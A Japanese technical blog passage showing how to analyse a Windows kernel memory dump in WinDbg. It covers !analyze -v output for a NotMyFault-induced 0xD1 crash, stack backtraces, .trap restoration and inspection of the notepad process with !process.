&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0xd1--driver-irql-not-less-or-equal&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Bug Check 0xD1 DRIVER&lt;em&gt;IRQL&lt;/em&gt;NOT&lt;em&gt;LESS&lt;/em&gt;OR_EQUAL - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このエラーは、&lt;code class=&quot;language-text&quot;&gt;PASSIVE_LEVEL(=最も低い割込みレベル)&lt;/code&gt;より高いレベルの&lt;code class=&quot;language-text&quot;&gt;Interrupt Request Level (IRQL)&lt;/code&gt;で動作するコードをページプール領域に展開しようとした際に発生するエラーです。&lt;/p&gt;
&lt;p&gt;詳しくは次の記事が参考になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sciencepark.co.jp/device_driver/dvdr/report-12/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;デバドラ講座12 │ サイエンスパーク株式会社&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;続いてレジストリ情報が出力されたあと、クラッシュした原因のプロセスとスタックトレースが出力されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;PROCESS_NAME:  notmyfault64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe

TRAP_FRAME:  ffffd48f77af97e0 &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;trap&lt;/span&gt; 0xffffd48f77af97e0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
NOTE: The &lt;span class=&quot;token keyword&quot;&gt;trap&lt;/span&gt; frame does not contain all registers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
Some register values may be zeroed or incorrect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
rax=00000000c85c00f0 rbx=0000000000000000 rcx=ffffd80241e00340
rdx=0000000000000890 rsi=0000000000000000 rdi=0000000000000000
rip=fffff80060da1981 rsp=ffffd48f77af9970 &lt;span class=&quot;token function&quot;&gt;rbp&lt;/span&gt;=0000000000000002
 r8=ffffd8024abbdc80  r9=0000000000000000 r10=ffffd80241e002c0
r11=ffffd8024aa9bff0 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         &lt;span class=&quot;token function&quot;&gt;nv&lt;/span&gt; up ei ng nz na pe nc
myfault+0x1981:
fffff800`60da1981 8b03            mov     eax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;dword ptr &lt;span class=&quot;token namespace&quot;&gt;[rbx]&lt;/span&gt; ds:00000000`00000000=????????
Resetting default scope

STACK_TEXT:  
ffffd48f`77af9698 fffff800`62a09169     : 00000000`0000000a ffffd802`4aaa8010 00000000`00000002 00000000`00000000 : nt!KeBugCheckEx
ffffd48f`77af96a0 fffff800`62a05469     : 00007ff8`f16ecc00 00000000`00000000 00000000`00000f4d 00000000`00000000 : nt!KiBugCheckDispatch+0x69
ffffd48f`77af97e0 fffff800`60da1981     : 00000000`00000000 ffffd48f`77af99c8 00000000`00000000 00000000`00000000 : nt!KiPageFault+0x469
ffffd48f`77af9970 fffff800`60da1d3d     : 00000000`c85c00f0 000001e3`5fb24550 00000000`000000f0 00000000`00000000 : myfault+0x1981
ffffd48f`77af99a0 fffff800`60da1ea1     : ffff9189`4ed94d70 00000000`00000000 00000000`00000000 fffff800`62bf5e51 : myfault+0x1d3d
ffffd48f`77af9ae0 fffff800`6288f865     : ffff9189`4ed94d70 00000000`00000001 ffffd48f`77af9ec0 00000000`00000001 : myfault+0x1ea1
ffffd48f`77af9b40 fffff800`62c75328     : ffffd48f`77af9ec0 ffff9189`4ed94d70 00000000`00000001 fffff800`00000000 : nt!IofCallDriver+0x55
ffffd48f`77af9b80 fffff800`62c74bf5     : 00000000`00000000 ffffd48f`77af9ec0 00000000`00000000 ffffd48f`77af9ec0 : nt!IopSynchronousServiceTail+0x1a8
ffffd48f`77af9c20 fffff800`62c745f6     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0x5e5
ffffd48f`77af9d60 fffff800`62a08bb5     : 00000000`fffffffc ffff5121`00000000 00000000`00000001 000001e3`5f5e99a0 : nt!NtDeviceIoControlFile+0x56
ffffd48f`77af9dd0 00007ff8`f16ece54     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25
0000007a`e6bde8d8 00000000`00000000     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ff8`f16ece54

SYMBOL_NAME:  myfault+1981
MODULE_NAME: myfault
IMAGE_NAME:  myfault&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
STACK_COMMAND:  &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;thread &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cxr &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; kb
BUCKET_ID_FUNC_OFFSET:  1981
FAILURE_BUCKET_ID:  AV_myfault!unknown_function
OS_VERSION:  10&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;19041&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1
BUILDLAB_STR:  vb_release
OSPLATFORM_TYPE:  x64
OSNAME:  Windows 10
FAILURE_ID_HASH:  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;9745090a-9bce-ccba-c096-ca6e9ca04c64&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
Followup:     MachineOwner&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このように、&lt;code class=&quot;language-text&quot;&gt;!analyze -v&lt;/code&gt;だけでもかなりの情報を確認することができます。&lt;/p&gt;
&lt;h3 id=&quot;スタックバックトレースの解析&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%90%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%81%AE%E8%A7%A3%E6%9E%90&quot; aria-label=&quot;スタックバックトレースの解析 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;スタックバックトレースの解析&lt;/h3&gt;
&lt;p&gt;続いて、スタックバックトレースを解析してみます。&lt;/p&gt;
&lt;p&gt;スタックバックトレースの表示コマンドについては、以下のドキュメントを参照。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/k--kb--kc--kd--kp--kp--kv--display-stack-backtrace-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;k、kb、kc、kd、kp、kP、kv (スタック バックトレースの表示) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;k / kb / kv&lt;/code&gt;の3つのコマンド結果を比較してみました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1143b35b663a53e8d322c8d21a49e0e2/cf8e5/image-21.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABjUlEQVQoz5VS2W7CMBDM//8V4kxJI0AJSRwngZyEUwgIh4Dp7qrloepDsTRar2WPZ2fXSNMa6/UKdV1jtVrheDxisVhgv9/jdruB1/P5/DcM36uglAfP8+E4DpbLJYIgQFlWuN/veDwe7xGqoEIcayJR0Fpju90iSRLMZjNRyqTvLMN1IiKMkOc5qfSEaD6fC/K8ECsYrLyqKolsx+FwEHt+w7DtEJb1gTTNYNs27S1Yw6HEXq+PwcBEv9+XfDweYzKZoCRiruQvGKYZ0IMuKZvT4wE6nQ663a7EVquFdrtN6MA0TYxGI3zSp0op8rgUgs1m84IQOlSy1qE0gT2M4xi+70ljOA/DUOKMfM3SVCyJ44QmY43T6YSmaV7g3EiSJfIiE4V8mQ/Z04SIOedzJoyiCIHvyxn7XZSF3L1er4KfEZMua62kDJ8esOGK1E2nU7iuK2DfeKRcAivmhjHxbrcj0kYmgSFjE+maLiSigCGEKpCSw+9PmJwngPdcbpZlMlpFUUhnL5cLzuez4AtJwOPcIhjU0QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1143b35b663a53e8d322c8d21a49e0e2/8ac56/image-21.webp 240w,
/static/1143b35b663a53e8d322c8d21a49e0e2/d3be9/image-21.webp 480w,
/static/1143b35b663a53e8d322c8d21a49e0e2/e46b2/image-21.webp 960w,
/static/1143b35b663a53e8d322c8d21a49e0e2/7e452/image-21.webp 1402w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1143b35b663a53e8d322c8d21a49e0e2/8ff5a/image-21.png 240w,
/static/1143b35b663a53e8d322c8d21a49e0e2/e85cb/image-21.png 480w,
/static/1143b35b663a53e8d322c8d21a49e0e2/d9199/image-21.png 960w,
/static/1143b35b663a53e8d322c8d21a49e0e2/cf8e5/image-21.png 1402w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1143b35b663a53e8d322c8d21a49e0e2/d9199/image-21.png&quot;
            alt=&quot;image-21.png&quot;
            title=&quot;image-21.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kv&lt;/code&gt;の方が情報量が多いことがわかります。
このコマンドではフレームポインターの省略された情報(FPO) 情報も表示します。&lt;/p&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;(TrapFrame @ ffffd48f&lt;/code&gt;77af97e0)`という表示に注視します。&lt;/p&gt;
&lt;p&gt;これはトラップフレーム(割り込み発生時のレジスタ、スタック)といって、この時点のスレッドの状態を復元するための非常に重要な情報です。&lt;/p&gt;
&lt;h3 id=&quot;トラップフレームからスレッドを復元する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%88%E3%83%A9%E3%83%83%E3%83%97%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%81%8B%E3%82%89%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%82%92%E5%BE%A9%E5%85%83%E3%81%99%E3%82%8B&quot; aria-label=&quot;トラップフレームからスレッドを復元する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;トラップフレームからスレッドを復元する&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.trap&lt;/code&gt;コマンドを使ってトラップフレームからスレッドの復元をしてみます。&lt;/p&gt;
&lt;p&gt;トラップフレームで復元した時点でのレジスタの情報が出力されました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;2: kd&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;trap&lt;/span&gt; ffffd48f`77af97e0
NOTE: The &lt;span class=&quot;token keyword&quot;&gt;trap&lt;/span&gt; frame does not contain all registers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
Some register values may be zeroed or incorrect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
rax=00000000c85c00f0 rbx=0000000000000000 rcx=ffffd80241e00340
rdx=0000000000000890 rsi=0000000000000000 rdi=0000000000000000
rip=fffff80060da1981 rsp=ffffd48f77af9970 &lt;span class=&quot;token function&quot;&gt;rbp&lt;/span&gt;=0000000000000002
 r8=ffffd8024abbdc80  r9=0000000000000000 r10=ffffd80241e002c0
r11=ffffd8024aa9bff0 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         &lt;span class=&quot;token function&quot;&gt;nv&lt;/span&gt; up ei ng nz na pe nc
myfault+0x1981:
fffff800`60da1981 8b03            mov     eax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;dword ptr &lt;span class=&quot;token namespace&quot;&gt;[rbx]&lt;/span&gt; ds:00000000`00000000=????????&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、スタックバックトレースの結果からも、トラップフレーム時点の状態に戻っていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;2: kd&gt; kv
  &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; Stack trace &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; last &lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt; context &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;thread/&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cxr resets it
 &lt;span class=&quot;token comment&quot;&gt;# Child-SP          RetAddr               : Args to Child                                                           : Call Site&lt;/span&gt;
00 ffffd48f`77af9970 fffff800`60da1d3d     : 00000000`c85c00f0 000001e3`5fb24550 00000000`000000f0 00000000`00000000 : myfault+0x1981
01 ffffd48f`77af99a0 fffff800`60da1ea1     : ffff9189`4ed94d70 00000000`00000000 00000000`00000000 fffff800`62bf5e51 : myfault+0x1d3d
02 ffffd48f`77af9ae0 fffff800`6288f865     : ffff9189`4ed94d70 00000000`00000001 ffffd48f`77af9ec0 00000000`00000001 : myfault+0x1ea1
03 ffffd48f`77af9b40 fffff800`62c75328     : ffffd48f`77af9ec0 ffff9189`4ed94d70 00000000`00000001 fffff800`00000000 : nt!IofCallDriver+0x55
04 ffffd48f`77af9b80 fffff800`62c74bf5     : 00000000`00000000 ffffd48f`77af9ec0 00000000`00000000 ffffd48f`77af9ec0 : nt!IopSynchronousServiceTail+0x1a8
05 ffffd48f`77af9c20 fffff800`62c745f6     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0x5e5
06 ffffd48f`77af9d60 fffff800`62a08bb5     : 00000000`fffffffc ffff5121`00000000 00000000`00000001 000001e3`5f5e99a0 : nt!NtDeviceIoControlFile+0x56
07 ffffd48f`77af9dd0 00007ff8`f16ece54     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TrapFrame @ ffffd48f`77af9e40&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
08 0000007a`e6bde8d8 00000000`00000000     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ff8`f16ece54&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;プロセスを確認する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot; aria-label=&quot;プロセスを確認する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロセスを確認する&lt;/h3&gt;
&lt;p&gt;ここからは、ファイルの保存途中で停止したメモ帳プログラムの動きをメモリダンプから解析してみます。&lt;/p&gt;
&lt;p&gt;次のコマンドで、稼働中のプロセスの一覧を参照できます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;process&lt;/span&gt; 0 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/-process&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;プロセス (WinDbg) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;!process 0 0&lt;/code&gt;のように、1番目の数値を0にした場合は、全プロセスについて情報が出力されます。&lt;/p&gt;
&lt;p&gt;特定のプロセスに関する情報のみを表示する場合は、1番目の値でプロセスの16進数アドレス、またはプロセスIDを指定します。&lt;/p&gt;
&lt;p&gt;また、2番目の数値を変更することでより詳細な情報を出力させることができます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;!process 0 0&lt;/code&gt;とした場合は、すべてのプロセスについて時間と優先度の統計情報が出力されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;!process 0 1&lt;/code&gt;とした場合は、プロセスに関連付けられているスレッドとイベントの一覧と、それらの待機状態に関する情報も出力させることができます。&lt;/p&gt;
&lt;p&gt;この出力の中から、メモ帳のプロセスの情報を探し当てます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;PROCESS&lt;/span&gt; ffff9189527e9080
    SessionId: 2  Cid: 1e90    Peb: bb6f2ac000  ParentCid: 15e8
    DirBase: 1d822d000  ObjectTable: ffffd80249eb8040  HandleCount: 817&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    Image: notepad&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いて、このプロセスのアドレスを利用して、プロセスの詳細情報を出力してみます。&lt;/p&gt;
&lt;p&gt;フラグ（2番目の値）を7に設定することで、1つのプロセスの完全な詳細を表示することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;2: kd&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;process&lt;/span&gt; ffff9189527e9080 7
&lt;span class=&quot;token keyword&quot;&gt;PROCESS&lt;/span&gt; ffff9189527e9080
    SessionId: 2  Cid: 1e90    Peb: bb6f2ac000  ParentCid: 15e8
    DirBase: 1d822d000  ObjectTable: ffffd80249eb8040  HandleCount: 817&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    Image: notepad&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe
    VadRoot ffff918953a30a20 Vads 285 Clone 0 Private 2175&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; Modified 340&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; Locked 2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    DeviceMap ffffd80247fe8cf0
    Token                             ffffd8024a19c770
    ElapsedTime                       00:00:47&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;378
    UserTime                          00:00:00&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;000
    KernelTime                        00:00:00&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;000
    QuotaPoolUsage&lt;span class=&quot;token namespace&quot;&gt;[PagedPool]&lt;/span&gt;         430688
    QuotaPoolUsage&lt;span class=&quot;token namespace&quot;&gt;[NonPagedPool]&lt;/span&gt;      39648
    Working &lt;span class=&quot;token function&quot;&gt;Set&lt;/span&gt; Sizes &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;now&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;min&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;max&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;11788&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 50&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 345&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;47152KB&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 200KB&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 1380KB&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    PeakWorkingSetSize                11793
    VirtualSize                       2101500 Mb
    PeakVirtualSize                   2101501 Mb
    PageFaultCount                    14745
    MemoryPriority                    BACKGROUND
    BasePriority                      8
    CommitCharge                      3452

        THREAD ffff91895309d080  Cid 1e90&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1e94  Teb: 000000bb6f2ad000 Win32Thread: ffff9189523d0fc0 WAIT: &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;UserRequest&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; UserMode Non-Alertable
            ffff918953118260  SynchronizationEvent
            ffff918952d83d80  QueueObject
        Not impersonating
        DeviceMap                 ffffd80247fe8cf0
        Owning &lt;span class=&quot;token keyword&quot;&gt;Process&lt;/span&gt;            ffff9189527e9080       Image:         notepad&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe
        Attached &lt;span class=&quot;token keyword&quot;&gt;Process&lt;/span&gt;          N/A            Image:         N/A
        Wait &lt;span class=&quot;token function&quot;&gt;Start&lt;/span&gt; TickCount      3492           Ticks: 12 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0:00:00:00&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;187&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        Context &lt;span class=&quot;token keyword&quot;&gt;Switch&lt;/span&gt; Count      10798          IdealProcessor: 2             
        UserTime                  00:00:00&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;140
        KernelTime                00:00:00&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;328
        Win32 &lt;span class=&quot;token function&quot;&gt;Start&lt;/span&gt; Address 0x00007ff7e2e85a30
        Stack Init ffffd48f777bffd0 Current ffffd48f777bead0
        Base ffffd48f777c0000 Limit ffffd48f777ba000 Call 0000000000000000
        Priority 10 BasePriority 8 PriorityDecrement 0 IoPriority 2 PagePriority 5
        Child-&lt;span class=&quot;token function&quot;&gt;SP&lt;/span&gt;          RetAddr               Call Site
        ffffd48f`777beb10 fffff800`6280c970     nt!KiSwapContext+0x76
        ffffd48f`777bec50 fffff800`6280be9f     nt!KiSwapThread+0x500
        ffffd48f`777bed00 fffff800`628805ce     nt!KiCommitThreadWait+0x14f
        ffffd48f`777beda0 fffff800`62c6f620     nt!KeWaitForMultipleObjects+0x2be
        ffffd48f`777beeb0 ffffeccb`d0c3798d     nt!ObWaitForMultipleObjects+0x2f0
        ffffd48f`777bf3b0 ffffeccb`d0b46c5e     win32kfull!xxxMsgWaitForMultipleObjectsEx+0xd9
        ffffd48f`777bf460 ffffeccb`d15d6fd0     win32kfull!NtUserMsgWaitForMultipleObjectsEx+0x3fe
        fffff800`62a08bb5     win32k!NtUserMsgWaitForMultipleObjectsEx+0x20
        ffffd48f`777bfdd0 00007ff8`eed7a104     nt!KiSystemServiceCopyEnd+0x25 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TrapFrame @ ffffd48f`777bfe40&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        000000bb`6f17e2d8 00000000`00000000     0x00007ff8`eed7a104
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 中略 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この出力情報から、ファイルを保存しようとしているタイミングのプロセスの情報を取得することができました。&lt;/p&gt;
&lt;p&gt;※今回はカーネルメモリダンプなので、カーネルモードプロセスの情報しか含まれていません。
ユーザモードのプロセスの情報も見る場合は、完全メモリダンプを取得する必要があります。&lt;/p&gt;
